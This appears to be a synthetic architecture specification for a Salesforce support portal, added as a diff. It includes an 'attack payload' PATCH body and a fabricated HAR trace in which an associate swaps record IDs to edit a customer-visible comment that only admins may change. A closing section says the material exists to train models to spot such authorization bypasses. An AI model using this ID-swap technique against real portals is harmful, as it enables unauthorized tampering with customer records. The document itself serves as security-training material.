@@ -1,0 +1,168 @@
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** SCT Global Support Hub (Experience Cloud)
+**Document Version:** 4.1.0 (DRAFT)
+**Classification:** SENSITIVE - CUSTOMER DATA
+**Domain:** Customer Support Services (CSS) / Experience Cloud
+
+## 1.0 Executive Summary
+The SCT Global Support Hub is a unified Experience Cloud portal spanning WS1 and WS2 environments. It serves as the primary interface for CSS customers to create, view, and track support cases. The system utilizes Salesforce Experience Cloud (Community) to surface internal Case data to external users while enforcing strict data residency and visibility boundaries (e.g., CSS-US vs. CSS-EU).
+
+A critical component of the system is the **Case Comment Logic**, which distinguishes between "Private" comments (internal-only discussion) and "Public" comments (customer-visible). The integrity of these communications is paramount for legal compliance and auditability.
+
+## 2.0 Network Topology & Access Boundaries
+The architecture is divided into the Public Portal Ingress, the Salesforce Multi-tenant Core, and the CIAM Identity Provider.
+
+### 2.1 Public Portal Ingress (Experience Cloud)
+* **Interface:** React-based Lightning Web Components (LWC) utilizing the Salesforce UI API.
+* **Access Control:** Restricted via "Account Access Restrictions" to ensure geographic segmentation (US vs EU).
+
+### 2.2 Application Logic (Salesforce Core)
+* **WS1/WS2 Integration:** Shared logic for case orchestration.
+* **Data Access:** Enforced via Apex Sharing, Permission Sets, and Sharing Rules (e.g., SCTWS2-865).
+* **API Layer:** GraphQL (UI API) used for high-performance data retrieval of Case and Comment records.
+
+## 3.0 Identity, Tenancy, and Authorization
+The system supports a tiered identity model integrated with Red Hat CIAM.
+
+### 3.1 Portal User Identity (Customer/Partner)
+Customers authenticate via CIAM/SSO. Upon login, they are assigned a Community Profile with limited object access.
+* **Constraints:** Must not view `Visibility__c == 'Private'` comments.
+
+### 3.2 Internal Associate Identity (Support Staff)
+Internal employees (Associates/EMs) access the system via standard Salesforce authentication.
+* **Authorization Claim:** Assigned specific Permission Sets (e.g., SCTWS2-1126).
+* **Comment Policy:** Can edit their **own** private comments; cannot edit public/customer-visible comments.
+
+### 3.3 Admin Identity (SF Admin)
+Privileged users with the ability to perform "Policy Exceptions," such as correcting/editing customer-visible communications.
+
+## 4.0 Service Behavior Notes
+System behavior, data contracts, and operational sequencing are described in subsequent sections.
+
+## 5.0 Case Comment Data Model
+The system uses the `CaseComment__c` object (or standard `CaseComment` with custom fields) to manage threaded support communications.
+
+### 5.1 Object Schema (Partial)
+| Field Name | Type | Description |
+| :--- | :--- | :--- |
+| `Id` | ID | Unique Record Identifier (Predictable base-64). |
+| `Body__c` | Text | The actual text of the comment. |
+| `Visibility__c` | Picklist | `Public` (Customer Visible) or `Private` (Internal Only). |
+| `CreatedById` | Reference | The user who authored the comment. |
+
+## 6.0 API Contract (GraphQL / UI API)
+The portal uses the following GraphQL structure to retrieve comments. 
+
+```graphql
+query getCaseComments($recordId: ID!) {
+  uiapi {
+    query {
+      Case(where: {Id: {eq: $recordId}}) {
+        edges {
+          node {
+            CaseComments__r(where: {Visibility__c: {eq: "Public"}}) {
+              edges {
+                node {
+                  Id
+                  Body__c { value }
+                  Visibility__c { value }
+                  IsCustomer__c { value }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+```
+
+## 7.0 REST API Record Update Contract
+**Endpoint:** `PATCH /ui-api/records/{recordId}`
+**Description:** Updates a specific record. Used by the "Edit Comment" feature.
+
+**Attack Payload Example:**
+```json
+{
+  "apiName": "CaseComment__c",
+  "fields": {
+    "Body__c": "This sensitive information has been redacted by the agent manually."
+  }
+}
+```
+
+
+
+
+# SYNTHETIC ARTIFACT: COMMENT PERMISSION BYPASS (HAR TRACE)
+**Applies to Architecture:** SCT Global Support Hub v4.1.0
+
+This trace shows an Associate (`usr_assoc_44`) successfully editing their own private comment, then immediately swapping the ID to edit a Public comment (`00aEk00000giSTc`) which should be restricted to SF Admins.
+
+```json
+{
+  "log": {
+    "version": "1.2",
+    "entries": [
+      {
+        "comment": "Authorized Edit: Associate edits their own Private comment",
+        "startedDateTime": "2026-04-08T14:10:01.000Z",
+        "request": {
+          "method": "PATCH",
+          "url": "https://sct.my.salesforce.com/services/data/v60.0/ui-api/records/00aEk00000giPRIVATE",
+          "headers": [
+            { "name": "Authorization", "value": "Bearer SESSION_TOKEN_ASSOC_44" }
+          ],
+          "postData": {
+            "text": "{\"fields\": {\"Body__c\": \"Updated private note logic.\"}}"
+          }
+        },
+        "response": {
+          "status": 200,
+          "statusText": "OK"
+        }
+      },
+      {
+        "startedDateTime": "2026-04-08T14:11:15.000Z",
+        "request": {
+          "method": "PATCH",
+          "url": "https://sct.my.salesforce.com/services/data/v60.0/ui-api/records/00aEk00000giPUBLIC_ID",
+          "headers": [
+            { "name": "Authorization", "value": "Bearer SESSION_TOKEN_ASSOC_44" }
+          ],
+          "postData": {
+            "text": "{\"fields\": {\"Body__c\": \"Unauthorized edit of customer-facing text.\"}}"
+          }
+        },
+        "response": {
+          "status": 200,
+          "statusText": "OK"
+        }
+      }
+    ]
+  }
+}
+```
+
+
+### Why this payload trains your model:
+1. **Logic-Gate Identification:** It forces the model to recognize that a `200 OK` is not always a success in a security context. If the user is an Associate and the target is a Public comment, the result *should* have been a `403 Forbidden`.
+2. **Context Separation:** It reinforces the distinction between **Ownership** (I wrote the comment) and **Visibility Type** (The comment is now Public, so I lose the right to edit it).
+3. **Experience Cloud Specificity:** It highlights how "experience cloud site accesses" (SCTWS2-1126) can grant broad technical permissions that must be limited by specific Apex triggers or Validation Rules to maintain the "SF Admin Only" policy.
+
+## 8.0 Platform Operations Addendum
+### 8.1 Pipeline Reliability Objectives
+- Build-to-deploy target tracks end-to-end duration for standard release classes.
+- Queue depth and worker saturation metrics control autoscaling for CI workloads.
+- Artifact integrity checks run before deploy-stage promotion.
+
+### 8.2 Runtime Telemetry
+- Control-plane APIs expose latency, error-rate, and transition-rate dashboards.
+- Webhook intake includes replay detection and source-identity trace correlation.
+- On-call views correlate release events with production SLO deviations.
+
+### 8.3 Release Discipline
+- High-risk flow changes require staged rollout and rollback simulation evidence.
+- Change windows are aligned with dependency maintenance calendars.
+- Release notes include operational guardrails and post-release verification tasks.
